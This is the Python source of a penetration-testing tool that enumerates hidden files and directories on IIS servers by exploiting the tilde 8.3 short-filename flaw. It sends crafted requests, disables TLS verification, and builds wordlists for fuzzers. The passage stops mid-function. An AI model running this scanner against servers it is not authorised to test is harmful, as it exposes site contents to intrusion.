#!/usr/bin/env python

"""
-------------------------------------------------------------------------------
Name:       tilde_enum.py
Purpose:    Advanced IIS Tilde 8.3 Enumeration Tool with Dictionary Generation
Author:     Husky (https://github.com/None87) - Enhanced Python 3 Version
Original:   esaBear, Micah Hoffman (@WebBreacher)
Version:    3.0 - Python 3 Compatible with Advanced Features
-------------------------------------------------------------------------------

Enhanced Features:
- Python 3 compatible with proper encoding handling
- Multi-threading support with robust timeout handling  
- Two-phase enumeration: high-priority matching + optional tildeGuess
- Dictionary generation mode for external fuzzing tools
- Batch URL processing and session/cookie support
- Integrated tildeGuess reverse-search algorithm
- Configurable HTTP timeouts to prevent hanging
- Interactive user prompts for extended enumeration

Usage Examples:
- Basic scan: python3 tilde_enum.py -u http://target/
- Fast scan: python3 tilde_enum.py -u http://target/ -t 50 --timeout 5  
- Dict gen: python3 tilde_enum.py -u http://target/ --dict-only
- Pipeline: python3 tilde_enum.py -u http://target/ --dict-only --dict-output - | ffuf -w - -u http://target/FUZZ

-------------------------------------------------------------------------------
"""

import os
import re
import ssl
import sys
import json
import ctypes
import random
import string
import urllib.request
import urllib.parse
import urllib.error
import argparse
import itertools
from time import sleep
from urllib.parse import urlparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from lib.getTerminalSize import getTerminalSize
import chardet

ssl._create_default_https_context = ssl._create_unverified_context

"""
COMPLETED ENHANCEMENTS (v3.0):
✅ 1. Detecting Listable Directory - Implemented with automatic detection
✅ 2. Mass URL as input - Added -U parameter for batch processing 
✅ 3. Threading - Multi-threading with configurable thread count and timeouts
✅ 4. Existing detection by different extensions - Enhanced file detection
✅ 5. Support login Session - Added customized cookie support (-c parameter)
✅ 6. Dictionary Generation - Added --dict-only mode for external tool integration
✅ 7. tildeGuess Integration - Advanced reverse-search algorithm
✅ 8. Two-Phase Enumeration - High-priority first, optional extended search
✅ 9. Timeout Handling - Robust HTTP timeouts to prevent hanging
✅ 10. Python 3 Compatibility - Full upgrade with proper encoding
"""

#=================================================
# Constants and Variables
#=================================================

# In the 'headers' below, change the data that you want sent to the remote server
# This is an IE10 user agent
headers = {'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)'}
methods = ["GET","POST","OPTIONS","HEAD","TRACE","TRACK","DEBUG"]
tails = ["\\a.asp","/a.asp","\\a.aspx","/a.aspx","/a.shtml","/a.asmx","/a.ashx","/a.config","/a.php","/a.jpg","","/a.xxx"]

# Targets is the list of files from the scanner output
targets = []

# Findings store the enumerate results
findings_new = []
findings_ignore = []
findings_file = []
findings_dir = []

# Location of the extension brute force word list
path_wordlists = 'wordlists/big.txt'
path_exts = 'wordlists/extensions.txt'
path_exts_ignore = 'wordlists/extensions_ignore.txt'
wordlists = []
exts = []
exts_ignore = []

# Character set to use for brute forcing
chars = 'abcdefghijklmnopqrstuvwxyz1234567890-_()'

# Response codes - user and error
response_profile = {}
response_profile['error'] = {}

# Environment logs
counter_requests = 0
using_method = "GET"
using_tail = "*~1*/.aspx"

# Terminal handler for Windows
if os.name == "nt":
    std_out_handle = ctypes.windll.kernel32.GetStdHandle(-11)

columns, rows = getTerminalSize()
spacebar = " " * columns + '\r'

# Threading support
thread_lock = threading.Lock()
max_threads = 10


#=================================================
# Functions & Classes
#=================================================

def printResult(msg, color='', level=1):
    global spacebar
    # print and output to file.
    # level = 0 : Mute on screen
    # level = 1 : Important messages
    # level = 2 : More details
    
    # In dict_only mode with stdout output, suppress most output to stderr for clean piping
    if hasattr(args, 'dict_only') and args.dict_only and args.dict_output == '-':
        if level <= 1 and ('[!]' in msg or 'ERROR' in msg.upper() or 'Failed' in msg):
            # Only show errors to stderr in dict_only mode
            sys.stderr.write(msg + '\n')
            sys.stderr.flush()
        return
    
    with thread_lock:
        if args.verbose_level >= level:
            sys.stdout.write(spacebar)
            sys.stdout.flush()
            if color:
                if os.name == "nt":
                    ctypes.windll.kernel32.SetConsoleTextAttribute(std_out_handle, color)
                    print(msg)
                    ctypes.windll.kernel32.SetConsoleTextAttribute(std_out_handle, bcolors.ENDC)
                else:
                    print(color + msg + bcolors.ENDC)
            else:
                print(msg)
        if args.out_file:
            if args.verbose_level >= level or level == 1:
                f = open(args.out_file, 'a+')
                f.write(msg + '\n')
                f.close()

def errorHandler(errorMsg="", forcePrint=True, forceExit=False):
    printResult('[!]  ' + errorMsg, bcolors.RED)
    if forceExit:
        if forcePrint: printFindings()
        sys.exit()
    else:
        # Auto-continue instead of prompting for input to avoid blocking
        printResult('[-] Auto-continuing after error...', bcolors.YELLOW)
        return

def getWebServerResponse(url, method=False):
    # This function takes in a URL and outputs the HTTP response code and content length (or error)
    global spacebar, counter_requests, using_method
    
    method = method if method is not False else using_method
    
    try:
        if args.verbose_level >= 2:  # Only show testing output at very high verbosity
            with thread_lock:
                sys.stdout.write(spacebar)
                sys.stdout.write("[*]  Testing: %s \r" % url)
                sys.stdout.flush()
        sleep(args.wait)
        
        counter_requests += 1
        # Add cookie support
        request_headers = headers.copy()
        if hasattr(args, 'cookie') and args.cookie:
            request_headers['Cookie'] = args.cookie
        
        req = urllib.request.Request(url, None, request_headers)
        req.get_method = lambda: method
        response = urllib.request.urlopen(req, timeout=args.timeout)
        return response
    except urllib.error.HTTPError as e:
        #ignore HTTPError (404, 400 etc)
        return e
    except urllib.error.URLError as e:
        errorHandler('Connection URLError: ' + str(e.reason))
        return getWebServerResponse(url, method)
    except Exception as e:
        errorHandler('Connection Error: Unknown')
        return getWebServerResponse(url, method)

def getGoogleKeywords(prefix):
    try:
        req = urllib.request.Request('http://suggestqueries.google.com/complete/search?q=%s&client=firefox&hl=en'% prefix)
        resp = urllib.request.urlopen(req, timeout=max(5, args.timeout))
        result_resp = json.loads(resp.read().decode('utf-8'))
        result = []
        for word in result_resp[1]:
            # keep only enumarable chars
            keywords = re.findall("["+chars+"]+", word)
            result.append(keywords[0])
            if len(keywords):
                result.append("".join(keywords))
        return list(set(result))
    except urllib.error.URLError as e:
        printResult('[!]  There is an error when retrieving keywords from Google: %s, skipped' % str(e.reason), bcolors.RED)
        return []
    except Exception as e:
        printResult('[!]  There is an unknown error when retrieving keywords form Google, skipped', bcolors.RED)
        return []

        
def file2List(path):
    if not os.path.isfile(path):
        printResult('[!]  Path %s not exists, change path relative to the script file' % path, bcolors.GREEN, 2)
        path = os.path.dirname(__file__) + os.sep + path
    if not os.path.isfile(path):
        printResult('[!]  Error. Path %s not existed.' % path, bcolors.RED)
        sys.exit()
    try:
        # Try to auto-detect encoding first
        with open(path, 'rb') as file:
            result = chardet.detect(file.read())
        encoding = result['encoding'] if result['encoding'] else 'utf-8'
        
        with open(path, 'r', encoding=encoding, errors='ignore') as f:
            return [line.strip().lower() for line in f if line.strip()]
    except IOError as e:
        printResult('[!]  Error while reading files. %s' % (e.strerror), bcolors.RED)
        sys.exit()

def initialCheckUrl(url):
    # This function checks to see if the web server is running and what kind of response codes
    # come back from bad requests (this will be important later)

    # Need to split url into protocol://host|IP and then the path
    u = urlparse(url)

    # Make a string that we can use to ensure we know what a "not found" response looks like
    not_there_string = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(13))
    printResult('[-]  Testing with dummy file request %s://%s%s%s.htm' % (u.scheme, u.netloc, u.path, not_there_string), bcolors.GREEN)
    not_there_url = u.scheme + '://' + u.netloc + u.path + not_there_string + '.htm'

    # Make the dummy request to the remote server
    not_there_response = getWebServerResponse(not_there_url)

    # Create a content length
    not_there_response_content_length = len(not_there_response.read())

    if not_there_response.getcode():
        printResult('[-]    URLNotThere -> HTTP Code: %s, Response Length: %s' % (not_there_response.getcode(), not_there_response_content_length))
        response_profile['not_there_code'], response_profile['not_there_length'] = not_there_response.getcode(), not_there_response_content_length
    else:
        printResult('[+]    URLNotThere -> HTTP Code: %s, Error Code: %s' % (not_there_response.code, not_there_response.reason))
        response_profile['not_there_code'], response_profile['not_there_reason'] = not_there_response.code

    # Check if we didn't get a 404. This would indicate custom error messages or some redirection and will cause issues later.
    if response_profile['not_there_code'] != 404:
        printResult('[!]  FALSE POSITIVE ALERT: We may have a problem determining real responses since we did not get a 404 back.', bcolors.RED)

    # Now that we have the "definitely not there" page, check for one that should be there
    printResult('[-]  Testing with user-submitted %s' % url, bcolors.GREEN)
    url_response = getWebServerResponse(url)
    if url_response.getcode():
        response_profile['user_length'] = len(url_response.read())
        response_profile['user_code'] = url_response.getcode()
        printResult('[-]    URLUser -> HTTP Code: %s, Response Length: %s' % (response_profile['user_code'], response_profile['user_length']))
    else:
        printResult('[+]    URLUser -> HTTP Code: %s, Error Code: %s' % (url_response.code, url_response.reason))
        response_profile['user_code'], response_profile['user_reason'] = url_response.code, url_response.reason

    # Check if we got an HTTP response code of 200.
    if response_profile['user_code'] != 200:
        printResult('[!]  WARNING: We did not receive an HTTP response code 200 back with given url.', bcolors.RED)
        #sys.exit()

def checkVulnerable(url):
    global methods, using_method

    # Set the default string to be IIS6.x
    check_string = '*~1*/.aspx' if args.limit_extension is None else '*~1'+args.limit_extension+'/.aspx'

    # Check if the server is IIS and vuln to tilde directory enumeration
    if args.f:
        printResult('[!]  You have used the -f switch to force us to scan. Well played. Using the IIS/6 "*~1*/.aspx" string.', bcolors.YELLOW)
        return check_string

    server_header = getWebServerResponse(url)
    if 'server' in server_header.headers:
        if 'IIS' in server_header.headers['server'] or 'icrosoft' in server_header.headers['server']:
            printResult('[+]  The server is reporting that it is IIS (%s).' % server_header.headers['server'], bcolors.GREEN)
            if   '5.' in server_header.headers['server']:
                check_string = '*~1*'
            elif '6.' in server_header.headers['server']:
                pass # just use the default string already set
        else:
            printResult('[!]  Warning. Server is not reporting that it is IIS.', bcolors.RED)
            printResult('[!]     (Response code: %s)' % server_header.getcode(), bcolors.RED)
    else:
        printResult('[!]  Error. Server is not reporting that it is IIS.', bcolors.RED)
        printResult('[!]     (Response code: %s)' % server_header.getcode(), bcolors.RED)

    # Check to see if the server is vulnerable to the tilde vulnerability
    isVulnerable = False
    for m in methods:
        resp1 = getWebServerResponse(args.url + '~1*/.aspx', method=m)
        resp2 = getWebServerResponse(args.url + '*~1*/.aspx', method=m)
        if resp1.code != resp2.code:
            printResult('[+]  The server is vulnerable to the IIS tilde enumeration vulnerability..', bcolors.YELLOW)
            printResult('[+]  Using HTTP METHOD: %s' % m, bcolors.GREEN)
            isVulnerable = True
            using_method = m
            break

    if isVulnerable == False:
        printResult('[!]  Error. Server is probably NOT vulnerable or given path is wrong.', bcolors.RED)
        printResult('[!]     If you know it is, use the -f flag to force testing and re-run the script.', bcolors.RED)
        sys.exit()
        
    return check_string

def addNewFindings(findings=[]):
    findings_new.extend(findings)
    
def findExtensions(url, filename):
    possible_exts = {}
    found_files = []
    notFound = True
    _filename = filename.replace("~","*~") # a quick fix to avoid strange response in enumeration

    if args.limit_extension:
        # We already know the extension, set notFound as False to ignore warnings
        notFound = False
        resp = getWebServerResponse(url+_filename+args.limit_extension+'*/.aspx')
        if resp.code == 404:
            possible_exts[args.limit_extension[1:]] = 1
    elif not args.limit_extension == '':
        for char1 in chars:
            resp1a = getWebServerResponse(url+_filename+'*'+char1+'*/.aspx')
            if resp1a.code == 404:  # Got the first valid char
                notFound = False
                possible_exts[char1] = 1
                for char2 in chars:
                    resp2a = getWebServerResponse(url+_filename+'*'+char1+char2+'*/.aspx')
                    if resp2a.code == 404:  # Got the second valid char
                        if char1 in possible_exts: del possible_exts[char1]
                        possible_exts[char1+char2] = 1
                        for char3 in chars:
                            resp3a = getWebServerResponse(url+_filename+'*'+char1+char2+char3+'/.aspx')
                            if resp3a.code == 404:  # Got the third valid char
                                if char1+char2 in possible_exts: del possible_exts[char1+char2]
                                possible_exts[char1+char2+char3] = 1
    
    # Check if it's a directory
    if not args.limit_extension and confirmDirectory(url, filename):
        notFound = False
        addNewFindings([filename+'/'])
        printResult('[+]  Enumerated directory:  ' +filename+'/', bcolors.YELLOW)
        # Check if directory is listable
        checkListableDirectory(url, filename)

    if notFound:
        addNewFindings([filename+'/'])
        printResult('[!]  Something is wrong:  %s%s/ should be a directory, but the response is strange.'%(url,filename), bcolors.RED)
    else:
        possible_exts = sorted(possible_exts.keys(), key=len, reverse=True)
        while possible_exts:
            item = possible_exts.pop()
            if not any(map(lambda s:s.endswith(item), possible_exts)):
                printResult('[+]  Enumerated file:  ' +filename+'.'+item, bcolors.YELLOW)
                found_files.append(filename+'.'+item)
        addNewFindings(found_files)
    return

def confirmDirectory(url, filename):
    resp = getWebServerResponse(url + filename + '/.aspx')
    if resp.code == 404 and 'x-aspnet-version' not in resp.headers:
        return True
    else:
        return False

def checkListableDirectory(url, dirname):
    """Check if a directory is listable (directory browsing enabled)"""
    try:
        resp = getWebServerResponse(url + dirname + '/')
        if resp.code == 200:
            content = resp.read().decode('utf-8', errors='ignore').lower()
            # Check for common directory listing indicators
            listable_indicators = [
                'index of /', 'directory listing', '<title>index of',
                'parent directory', '[to parent directory]', '<pre>',
                'folder.gif', 'dir.gif', 'directory.gif'
            ]
            if any(indicator in content for indicator in listable_indicators):
                printResult('[+]  Listable directory detected: %s%s/' % (url, dirname), bcolors.CYAN)
                return True
        return False
    except Exception:
        return False

def counterEnum(url, check_string, found_name):
    # Enumerate ~2 ~3 and so on
    foundNameWithCounter = [found_name+'~1']
    lastCounter = 1
    for i in range(2, 10):
        test_name = '%s~%d' % (found_name, i)
        test_url = url + test_name + '*/.aspx'
        resp = getWebServerResponse(test_url)
        if resp.code == 404:
            foundNameWithCounter.append(test_name)
            lastCounter = i
        else: # if ~2 is not existed, no need for ~3
            break

    if lastCounter > 1:
        printResult('[+]  counterEnum: %s~1 to ~%d.'%(found_name,lastCounter), bcolors.GREEN, 2)
    for filename in foundNameWithCounter:
        findExtensions(url, filename)

def charEnum(url, check_string, current_found):
    # Enumerate character recursively
    notFound = True
    current_length = len(current_found)
    if current_length >= 6:
        counterEnum(url, check_string, current_found)
        return
    elif current_length > 0 and not args.limit_extension == '':
        # If in directory searching mode, no need for this check
        # check if there are matched names shorter than 6
        test_url = url + current_found + check_string[1:]
        resp = getWebServerResponse(test_url)
        if resp.code == 404:
            counterEnum(url, check_string, current_found)
            notFound = False
    
    def test_char(char):
        test_name = current_found + char
        if args.resume_string and test_name < args.resume_string[:current_length+1]: 
            return False
        resp = getWebServerResponse(url + test_name + check_string)
        if resp.code == 404:
            charEnum(url, check_string, test_name)
            return True
        return False
    
    # Use threading for character enumeration only at the first level to avoid thread explosion
    if args.threads > 1 and current_length == 0:
        with ThreadPoolExecutor(max_workers=min(args.threads, len(chars))) as executor:
            future_to_char = {executor.submit(test_char, char): char for char in chars}
            for future in as_completed(future_to_char, timeout=args.timeout*3):
                try:
                    if future.result(timeout=args.timeout):
                        notFound = False
                except Exception as e:
                    if args.verbose_level >= 2:
                        printResult('[!]  Thread error in tilde enum: %s' % str(e), bcolors.RED)
                    continue
    else:
        # Single-threaded for deeper levels or when threading is disabled
        for char in chars:
            if test_char(char):
                notFound = False
    
    if notFound:
        printResult('[!]  Something is wrong:  %s%s[?] cannot continue. Maybe not in searching charcters.'%(url,current_found), bcolors.RED)
    
def checkEightDotThreeEnum(url, check_string, dirname='/'):
    # Here is where we find the files and dirs using the 404 and 400 errors
    # If the dir var is not passed then we assume this is the root level of the server

    url = url + dirname

    charEnum(url, check_string, '')
    printResult('[-]  Finished doing the 8.3 enumeration for %s.' % dirname, bcolors.GREEN)
    # clear resume string. Since it just work for first directory
    args.resume_string = ''
    return

def confirmUrlExist(url, isFile=True):
    # Check if the given url is existed or not there
    resp = getWebServerResponse(url, method="GET")
    if resp.code != response_profile['not_there_code']:
        size = len(resp.read())
        if response_profile['not_there_code'] == 404:
            return True
        elif not isFile and resp.code == 301:
            return True
        elif isFile and resp.code == 500:
            return True
        elif size != response_profile['not_there_length']:
            return True
        else:
            printResult('[!]  Strange. Not sure if %s is existed.' % url, bcolors.YELLOW, 2)
            printResult('[!]     Response code=%s, size=%s' % (resp.code, size), bcolors.ENDC, 2)
    return False

def urlPathEnum(baseUrl, prefix, possible_suffixs, possible_extensions, isFile):
    # combine all possible wordlists to check if url exists
    ls = len(possible_suffixs)
    le = len(possible_extensions)
    printResult("[-]  urlPathEnum: '%s' + %d suffix(s) + %d ext(s) = %d requests"% (prefix,ls,le,ls*le), bcolors.ENDC, 2)
    
    counter = 0
    
    def test_single_path(suffix, extension=None):
        if isFile and extension:
            full_path = prefix + suffix + '.' + extension
            # URL encode the path to handle special characters and spaces
            encoded_path = urllib.parse.quote(full_path, safe='/')
            if confirmUrlExist(baseUrl + encoded_path):
                findings_file.append(full_path)
                printResult('[+]  Found existing file: %s%s' % (baseUrl, full_path), bcolors.GREEN)
                return True
        return False
    
    def test_single_dir(suffix):
        # URL encode the path to handle special characters and spaces
        encoded_path = urllib.parse.quote(prefix + suffix, safe='/')
        if confirmUrlExist(baseUrl + encoded_path, False):
            findings_dir.append(prefix + suffix + '/')
            printResult('[+]  Found existing directory: %s%s/' % (baseUrl, prefix + suffix), bcolors.GREEN)
            return True
        return False
    
    # Use threading for path enumeration if enabled and we have enough tasks
    if args.threads > 1 and isFile and len(possible_suffixs) * len(possible_extensions) > args.threads:
        tasks = [(suffix, ext) for suffix in possible_suffixs for ext in possible_extensions]
        with ThreadPoolExecutor(max_workers=min(args.threads, len(tasks))) as executor:
            futures = [executor.submit(test_single_path, suffix, ext) for suffix, ext in tasks]
            for future in as_completed(futures, timeout=args.timeout*3):
                try:
                    if future.result(timeout=args.timeout):
                        counter += 1
                except Exception as e:
                    if args.verbose_level >= 2:
                        printResult('[!]  Thread error: %s' % str(e), bcolors.RED)
                    continue
    elif args.threads > 1 and not isFile and len(possible_suffixs) > args.threads:
        with ThreadPoolExecutor(max_workers=min(args.threads, len(possible_suffixs))) as executor:
            futures = [executor.submit(test_single_dir, suffix) for suffix in possible_suffixs]
            for future in as_completed(futures, timeout=args.timeout*3):
                try:
                    if future.result(timeout=args.timeout):
                        counter += 1
                except Exception as e:
                    if args.verbose_level >= 2:
                        printResult('[!]  Thread error: %s' % str(e), bcolors.RED)
                    continue
    else:
        # Single-threaded execution (original logic)
        for suffix in possible_suffixs:
            if isFile:
                for extension in possible_extensions:
                    if confirmUrlExist(baseUrl + prefix + suffix + '.' + extension):
                        findings_file.append(prefix + suffix + '.' + extension)
                        printResult('[+]  Found existing file: %s%s' % (baseUrl, prefix + suffix + '.' + extension), bcolors.GREEN)
                        counter += 1
            elif confirmUrlExist(baseUrl + prefix + suffix, False):
                findings_dir.append(prefix + suffix + '/')
                printResult('[+]  Found existing directory: %s%s/' % (baseUrl, prefix + suffix), bcolors.GREEN)
                counter += 1
    
    return counter
    
# Removed common dictionary brute force to maintain original pure dictionary matching approach

#=================================================
# tildeGuess Integration - Advanced Dictionary Matching
#=================================================

def loadDictionary(dictionary_file):
    """Load dictionary with automatic encoding detection"""
    try:
        with open(dictionary_file, 'rb') as file:
            result = chardet.detect(file.read())
        
        encoding = result['encoding'] if result['encoding'] else 'utf-8'
        
        with open(dictionary_file, 'r', encoding=encoding) as file:
            return file.read()
    except Exception as e:
        printResult('[!]  Error loading dictionary %s: %s' % (dictionary_file, str(e)), bcolors.RED)
        return ""

def generateMatches(input_word, dictionary):
    """Generate possible matches using tildeGuess reverse-search algorithm"""
    matches = []
    dism = ""
    input_word_r = input_word[::-1]  # Reverse the input word
    
    # Search backwards through the input word
    for i in input_word_r:
        dism = i + dism
        res = re.findall(r"{}.*".format(re.escape(dism)), dictionary, re.MULTILINE|re.IGNORECASE)
        # Complete word with prefix
        prefix_res = [input_word[0:input_word.rfind(dism)] + sub for sub in res if sub]
        # Convert to lowercase
        res = [match.lower() for match in prefix_res]
        # Remove duplicates
        matches.extend(list(set(res)))
    
    return list(set(matches))

def extensionsComplete(name, extensions_file="wordlists/extensions.txt"):
    """Complete extensions based on partial extension match"""
    try:
        if '.' not in name:
            return [name]
            
        extensions_name = name.split(".")[-1].lower()
        
        with open(extensions_file, "r") as f:
            extensions_list = f.read()
            
        possible_extensions_name = re.findall(r"^{}.*".format(re.escape(extensions_name)), extensions_list, re.MULTILINE)
        
        result = []
        base_name = name.rsplit(".", 1)[0]
        for ext in possible_extensions_name:
            if ext.strip():  # Skip empty extensions
                result.append("{}.{}".format(base_name, ext.strip()))
        
        return result if result else [name]
    except Exception as e:
        printResult('[!]  Error in extension completion: %s' % str(e), bcolors.RED)
        return [name]

def tildeGuessEnum(url, short_name, dictionary_text, isFile=True, generate_only=False):
    """Enhanced enumeration using tildeGuess algorithm"""
    if not short_name or not dictionary_text:
        return []
        
    generated_names = []
    
    # Extract base name and extension
    if isFile and '.' in short_name:
        base_name, extension = short_name.rsplit('.', 1)
        # Remove tilde numbering
        if '~' in base_name:
            base_name = base_name.rsplit('~', 1)[0]
        extension = '.' + extension
    else:
        base_name = short_name.rstrip('/')
        if '~' in base_name:
            base_name = base_name.rsplit('~', 1)[0]
        extension = ''
    
    # Generate matches using reverse-search algorithm
    matches = generateMatches(base_name, dictionary_text)
    
    if isFile and extension:
        # Add extension completion for files
        temp_results = []
        for match in matches:
            temp_name = match + extension
            extended_names = extensionsComplete(temp_name)
            temp_results.extend(extended_names)
        matches = temp_results
    
    if matches:
        printResult('[+]  tildeGuess found %d potential matches for "%s"' % (len(matches), short_name), bcolors.CYAN)
        generated_names.extend(matches)
        
        # If generate_only mode, just return the names
        if generate_only:
            return generated_names
        
        # Otherwise test each potential match (legacy mode)
        foundNum = 0
        for match in matches:
            try:
                # URL encode the match to handle special characters and spaces
                encoded_match = urllib.parse.quote(match, safe='/')
                test_url = url + ('/' if not url.endswith('/') else '') + encoded_match
                if confirmUrlExist(test_url):
                    found_something = url + '/' + match
                    if found_something not in findings:
                        findings.append(found_something)
                        printResult('  [*]  tildeGuess SUCCESS: %s' % found_something, bcolors.GREEN)
                        foundNum += 1
            except Exception as e:
                if args.verbose_level >= 2:
                    printResult('[!]  Error testing %s: %s' % (match, str(e)), bcolors.RED)
                continue
        return foundNum
    
    return generated_names if generate_only else 0

def generateDictionaryFromFindings(output_file=None):
    """Generate dictionary file from tilde enumeration findings"""
    if not findings_new:
        printResult('[!]  No tilde enumeration findings to process', bcolors.RED)
        return
    
    dictionary_text = loadDictionary(args.path_wordlists)
    if not dictionary_text:
        printResult('[!]  Failed to load dictionary for generation', bcolors.RED)
        return
    
    all_generated_names = []
    
    for finding in findings_new:
        isFile = True
        possible_exts = []
        original_finding = finding
        
        if finding.endswith('/'):
            isFile = False
            finding = finding[:-1] + '.' # add this dot for split
            
        (filename, ext) = finding.split('.')
        if filename[-1] != '1':
            continue # skip the same filename
        # remove tilde and number
        filename = filename[:-2]

        # find all possible extensions
        if isFile:
            possible_exts = [extension for extension in exts if extension.startswith(ext) and extension != ext]
            possible_exts.append(ext)
        
        # Phase 1: Generate high-priority matches first (like original wordlistRecursive Phase 1)
        high_priority_matches = []
        words_startswith = [word for word in wordlists if word.startswith(filename) and word != filename]
        words_startswith.append(filename)
        
        # Generate high priority candidates with extensions
        if isFile:
            for word in words_startswith:
                for extension in possible_exts:
                    high_priority_matches.append(word + '.' + extension)
        else:
            high_priority_matches.extend(words_startswith)
        
        printResult('[*]  Generated %d high-priority matches for: %s' % (len(high_priority_matches), original_finding), bcolors.GREEN)
        all_generated_names.extend(high_priority_matches)
        
        # Phase 2: Generate additional tildeGuess entries (lower priority)
        if args.enable_tilde_guess:
            generated_names = tildeGuessEnum("", original_finding, dictionary_text, isFile, generate_only=True)
            if generated_names:
                printResult('[+]  Generated %d additional tildeGuess names for %s' % (len(generated_names), original_finding), bcolors.CYAN)
                all_generated_names.extend(generated_names)
    
    # Remove duplicates while preserving order (high priority first)
    seen = set()
    unique_names = []
    for name in all_generated_names:
        if name not in seen:
            seen.add(name)
            unique_names.append(name)
    
    if output_file and output_file != '-':
        try:
            with open(output_file, 'w') as f:
                for name in unique_names:
                    f.write(name + '\n')
            printResult('[+]  Generated dictionary saved to: %s' % output_file, bcolors.GREEN)
            printResult('[+]  Total unique entries: %d' % len(unique_names), bcolors.GREEN)
        except Exception as e:
            printResult('[!]  Error writing dictionary file: %s' % str(e), bcolors.RED)
    else:
        # Print to stdout - only output dictionary for piping
        for name in unique_names:
            print(name)
    
    return unique_names

def wordlistRecursive(url, prefix, suffix, possible_extensions, isFile):
    # Recursively split filename into prefix and suffix, and enum the words that start with suffix
    if suffix == '': 
        return 0  # No more suffix to process
    
    # Phase 1: finding words that start with filename (most possible result)
    words_startswith = [word for word in wordlists if word.startswith(suffix) and word != suffix]
    words_startswith.append(suffix)

    if args.enable_google:
        words_startswith.extend(getGoogleKeywords(suffix))

    foundNum = urlPathEnum(url, prefix, list(set(words_startswith)), possible_extensions, isFile)
    if foundNum: return foundNum
    
    # Phase 2: move known words to prefix, and continue enum the rest
    for word in wordlists:
        if len(word) > 1 and suffix.startswith(word):
            foundNum = wordlistRecursive(url, prefix + word, suffix[len(word):], possible_extensions, isFile)
            if foundNum: return foundNum
    
    # Phase 3: if no prefix found in dictionary, simply move the first character
    return wordlistRecursive(url, prefix + suffix[0], suffix[1:], possible_extensions, isFile)
    
def wordlistEnum(url):
    if args.dict_only:
        # Dictionary generation mode - skip URL testing, generation happens in generateDictionaryFromFindings
        return
    
    # Phase 1: Complete all high-priority wordlist tests first
    printResult('[*]  Phase 1: Testing high-priority wordlist matches...', bcolors.CYAN)
    unfound_findings = []
    
    for finding in findings_new:
        isFile = True
        possible_exts = []
        original_finding = finding
        
        if finding.endswith('/'):
            isFile = False
            finding = finding[:-1] + '.' # add this dot for split
            
        (filename, ext) = finding.split('.')
        if filename[-1] != '1':
            break # skip the same filename
        # remove tilde and number
        filename = filename[:-2]

        # find all possible extensions
        if isFile:
            possible_exts = [extension for extension in exts if extension.startswith(ext) and extension != ext]
            possible_exts.append(ext)

        # Try original wordlist recursive method
        foundNum = wordlistRecursive(url, '', filename, possible_exts, isFile)
        if not foundNum:
            # Keep track of unfound items for potential tildeGuess processing
            unfound_findings.append((original_finding, isFile, filename, possible_exts))
    
    # Phase 2: Handle unfound items with tildeGuess (if enabled or user agrees)
    if unfound_findings:
        printResult('[*]  Phase 1 complete. %d items found through high-priority matching.' % (len(findings_file) + len(findings_dir)), bcolors.GREEN)
        printResult('[*]  %d items not found in high-priority matching.' % len(unfound_findings), bcolors.YELLOW)
        
        should_use_tildeguess = args.enable_tilde_guess
        if not should_use_tildeguess:
            # Ask user if they want to try tildeGuess for unfound items
            sys.stdout.write('[?]  Try tildeGuess algorithm for remaining %d unfound items? (y/N): ' % len(unfound_findings))
            sys.stdout.flush()
            try:
                response = input().strip().lower()
                should_use_tildeguess = response in ['y', 'yes']
            except (EOFError, KeyboardInterrupt):
                should_use_tildeguess = False
                print()
        
        if should_use_tildeguess:
            printResult('[*]  Phase 2: Using tildeGuess algorithm for unfound items...', bcolors.CYAN)
            dictionary_text = loadDictionary(args.path_wordlists)
            if dictionary_text:
                for original_finding, isFile, filename, possible_exts in unfound_findings:
                    printResult('[*]  Trying tildeGuess algorithm for: %s' % original_finding, bcolors.YELLOW)
                    foundNum = tildeGuessEnum(url, original_finding, dictionary_text, isFile)
                    if foundNum:
                        printResult('[+]  tildeGuess found %d matches for %s' % (foundNum, original_finding), bcolors.GREEN)
            else:
                printResult('[!]  Failed to load dictionary for tildeGuess', bcolors.RED)
        else:
            printResult('[*]  Skipping tildeGuess algorithm.', bcolors.YELLOW)

# Removed character brute force function to maintain original dictionary-based approach

def printFindings():
    printResult('[+] Total requests sent: %d'% counter_requests)
    if findings_new or findings_ignore or findings_file or findings_dir:
        printResult('\n---------- OUTPUT START ------------------------------')
        printResult('[+] Raw results: %s'% (len(findings_new) if findings_new else 'None.'))
        for finding in sorted(findings_new):
            printResult(args.url + finding)
        
        if findings_ignore:
            printResult('\n[+] Ignored results: %s'% len(findings_ignore))
            for finding in sorted(findings_ignore):
                printResult(args.url + finding)
            
        printResult('\n[+] Existing files found: %s'% (len(findings_file) if findings_file else 'None.'))
        for finding in sorted(findings_file):
            printResult(args.url + finding)
            
        printResult('\n[+] Existing Directories found: %s'% (len(findings_dir) if findings_dir else 'None.'))
        for finding in sorted(findings_dir):
            printResult(args.url + finding)
        printResult('---------- OUTPUT COMPLETE ---------------------------\n\n\n')
    else:
        printResult('[!]  No Result Found!\n\n\n', bcolors.RED)
        

def processURL(target_url):
    """Process a single URL for tilde enumeration"""
    global findings_new, findings_ignore, findings_file, findings_dir, counter_requests
    
    # Reset findings for this URL
    findings_new.clear()
    findings_ignore.clear()
    findings_file.clear()
    findings_dir.clear()
    counter_requests = 0
    
    # Ensure URL ends with /
    if target_url[-1:] != '/':
        target_url += '/'
    
    printResult('\n' + '='*60, bcolors.GREEN)
    printResult('[*]  Starting enumeration for: %s' % target_url, bcolors.GREEN)
    printResult('='*60, bcolors.GREEN)
    
    # Break apart the url for later use
    url = urlparse(target_url)
    url_ok = url.scheme + '://' + url.netloc + url.path
    
    # Perform tilde enumeration (always needed to get real short filenames)
    try:
        initialCheckUrl(target_url)
        
        # Check to see if the remote server is IIS and vulnerable to the Tilde issue
        check_string = checkVulnerable(target_url)

        # Do the initial search for files in the root of the web server
        checkEightDotThreeEnum(url.scheme + '://' + url.netloc, check_string, url.path)
    except KeyboardInterrupt:
        sys.stdout.write(' (interrupted!) ...\n')
        printResult('[!]  Stop tilde enumeration manually. Try wordlist enumeration from current findings now...', bcolors.RED)

    try:
        # separate ignorable extension from findings
        findings_ignore.extend([f for f in findings_new for e in exts_ignore if f.endswith(e)])
        findings_new[:] = [f for f in findings_new if f not in findings_ignore]
        # find real path by wordlist enumerate
        wordlistEnum(url_ok)
    except KeyboardInterrupt:
